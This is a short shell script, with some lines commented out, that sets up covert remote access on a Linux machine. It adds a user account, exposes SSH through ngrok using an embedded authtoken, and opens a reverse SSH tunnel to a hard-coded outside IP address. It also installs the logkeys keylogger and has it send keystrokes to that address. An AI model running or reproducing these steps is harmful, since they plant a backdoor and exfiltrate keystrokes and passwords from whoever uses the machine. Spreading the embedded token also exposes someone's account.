#sudo apt update
#sudo apt install openssh-server -y
#sudo ufw allow ssh
#echo "GatewayPorts clientspecified" | sudo tee -a /etc/ssh/sshd_config
#systemctl reload ssh.service
#ssh -N -R 27580:localhost:22 gizmo@75.138.184.49
#ssh -R 27580:localhost:22 gizmo@75.138.184.49
#wget http://launchpadlibrarian.net/165012984/logkeys_0.1.1a+git5ef6b0dcb9e3-2_amd64.deb
#sudo apt install logkeys_0.1.1a+git5ef6b0dcb9e3-2_amd64.deb
#logkeys -s --post-size=1K --post-irc 75.138.184.49:27580

sudo adduser --gecos 'gizmospw' gizmo
wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz
tar -xvf ngrok-v3-stable-linux-amd64.tgz
./ngrok config add-authtoken 28Kn9ch4pzaAkXtG3CigpJWhgb7_2WcHxNFrNGXeTdBJnXBpy
./ngrok tcp 22
